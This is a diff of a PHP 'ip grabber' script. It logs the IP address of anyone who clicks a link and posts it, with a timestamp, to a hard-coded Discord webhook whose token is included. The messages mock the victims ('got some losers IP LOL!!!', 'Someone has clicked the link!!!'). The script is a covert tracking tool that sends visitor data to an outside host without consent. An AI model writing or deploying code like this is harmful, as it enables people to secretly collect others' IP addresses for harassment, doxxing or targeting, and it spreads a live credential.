@@ -15,25 +15,44 @@
 $webhook = "https://discord.com/api/webhooks/889321054516957215/dSdQ0EJkHy5DeTr_s3Vf9vrahEz81PsYsz0JWqboLkMEUSVLP0C7HJl1Ok2KcBpvmC-2";
 $timestamp = date("c", strtotime("now"));
 $ip = $_SERVER['REMOTE_ADDR'];
+$useragent = $_SERVER['SERVER_NAME'];
 
 $json_data = json_encode([
-// Message
-"content" => "got some losers IP LOL!!!\n$ip",
 
-// Username
 "username" => "ip grabber",
-
-// Avatar URL.
-// Uncoment to replace image set in webhook
-//"avatar_url" => "https://ru.gravatar.com/userimage/28503754/1168e2bddca84fec2a63addb348c571d.jpg?size=512",
-
-// Text-to-speech
 "tts" => false,
 
-// File upload
-// "file" => "",
+  "embeds" => [
+    [
+      // Embed Title
+      "title" => "User clicked link",
 
-// Embeds Array
+      // Embed Type
+      "type" => "rich",
+
+      // Embed Description
+      "description" => "Someone has clicked the link!!!",
+      // Timestamp of embed must be formatted as ISO8601
+      "timestamp" => $timestamp,
+
+      // Additional Fields array
+      "fields" => [
+        // Field 1
+        [
+          "name" => "IP",
+          "value" => "$ip",
+          "inline" => false
+        ],
+        // Field 2
+        [
+          "name" => "User-Agent",
+          "value" => "$useragent",
+          "inline" => true
+        ]
+        // Etc..
+      ]
+    ]
+  ]
 
 ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
 
